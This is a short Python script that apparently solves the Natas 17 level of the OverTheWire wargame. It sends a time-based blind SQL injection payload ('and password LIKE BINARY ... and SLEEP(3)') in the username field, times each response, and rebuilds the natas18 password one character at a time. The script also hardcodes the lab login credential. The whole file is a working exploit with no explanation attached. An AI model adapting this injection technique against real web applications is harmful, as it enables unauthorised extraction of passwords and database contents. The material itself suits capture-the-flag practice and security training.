#!/usr/bin/env python3
import string
import requests

passwd_dict = string.digits + string.ascii_letters
auth_username = 'natas17'
auth_password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
passwd = ''

url = 'http://natas17.natas.labs.overthewire.org/index.php'
for i in range(0, 32):
    for char in passwd_dict:
        params = {
            'username': 'natas18" and password LIKE BINARY "{}{}%" and SLEEP(3) -- ;'.format(passwd, char),
            'debug'   : True
        }
        r = requests.get(url, params=params, auth=(auth_username,auth_password))
        elps = r.elapsed.total_seconds()

        if elps > 3:
            passwd += char
            print(passwd)
            break